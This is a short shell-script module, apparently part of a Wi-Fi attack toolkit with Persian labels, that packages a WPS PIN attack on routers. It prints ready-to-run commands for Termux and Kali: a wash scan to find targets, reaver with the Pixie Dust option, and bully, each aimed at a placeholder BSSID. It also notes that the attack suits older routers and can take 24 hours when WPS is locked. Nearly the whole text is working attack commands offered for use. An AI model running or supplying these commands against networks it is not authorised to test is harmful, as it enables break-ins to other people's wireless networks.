DESC="حمله به WPS (پین)"
REQ="reaver/bully"
RISK="HIGH"
NOTE="روترهای قدیمی. اگر WPS قفل باشد ۲۴ ساعت طول می‌کشد"

termux(){ echo "su -c 'reaver -i wlan0 -b <BSSID> -vv'"; }

kali(){
cat <<'EOF'
sudo wash -i wlan0mon
sudo reaver -i wlan0mon -b <BSSID> -vv -K 1
sudo bully wlan0mon -b <BSSID> -d
EOF
}
